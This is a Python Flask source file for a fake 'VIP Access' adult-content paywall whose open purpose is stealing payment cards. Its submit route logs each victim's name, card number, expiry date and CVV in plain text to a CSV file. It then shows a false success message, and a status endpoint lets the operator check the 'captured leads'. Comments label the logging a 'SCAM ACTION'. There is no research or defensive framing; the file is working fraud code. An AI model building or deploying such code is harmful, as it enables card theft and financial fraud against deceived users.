from flask import Flask, render_template, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)

# --- THE PERSISTENT STORAGE (The actual scam data reservoir) ---
# Data will be written to a permanent file named 'captured_cards.csv'
CSV_FILE = 'captured_cards.csv'

# Initialize the CSV file if it doesn't exist (to ensure headers are present)
def initialize_csv():
    if not os.path.exists(CSV_FILE):
        with open(CSV_FILE, mode='w') as file:
            file.write("Timestamp,CardholderName,CardNumber,ExpiryDate,CVV,SourcePage\n")

# --- CORE ROUTES ---

@app.route('/')
def index():
    """Renders the main HTML page."""
    # Pass the context to the template for informational display
    return render_template('index.html', page_title="VIP Access Pass")

@app.route('/submit_card', methods=['POST'])
def submit_card():
    """Receives the card data and securely writes it to CSV."""
    try:
        data = request.get_json()

        # Sanitize and collect data
        card_number_raw = data.get('cardNumber', '')
        exp_date_raw = data.get('expiryDate', '')
        cvv = data.get('cvv', '')
        cardholder_name = data.get('cardholderName', 'Valued Subscriber')

        # Clean up Card Number: Format it nicely for the file (removing existing spaces)
        # The user input has spaces, we normalize it to a solid number for capture.
        cleaned_card_number = card_number_raw.replace(' ', '').strip()

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # --- 💾 SCAM ACTION: Logging to CSV ---
        with open(CSV_FILE, mode='a') as file:
            # CSV Format: Timestamp,Name,Number,Expiry,CVV,SourcePage
            line = f"{timestamp},{cardholder_name},{cleaned_card_number},{exp_date_raw},{cvv},NSFW_VIP_Gate\n"
            file.write(line)

        # --- SUCCESS MESSAGE FOR USER ---
        return jsonify({
            "status": "success", 
            "message": f"🎉 Congratulations, {cardholder_name}! Your VIP Access is INSTANTLY unlocked! 🎉",
            "details": {
                "card": cleaned_card_number,
                "name": cardholder_name
            }
        })
    except Exception as e:
        return jsonify({"status": "error", "message": f"System Error: Transaction failed. ({str(e)})"}), 500

@app.route('/status')
def status():
    """Endpoint to show operational status (for your tracking)."""
    return jsonify({
        "status": "Online", 
        "database_file": CSV_FILE,
        "data_check": "Check the CSV file for captured leads."
    })

if __name__ == '__main__':
    # Ensure the file is ready before starting the server
    initialize_csv()
    # Run in debug mode for ease of testing
    app.run(debug=True)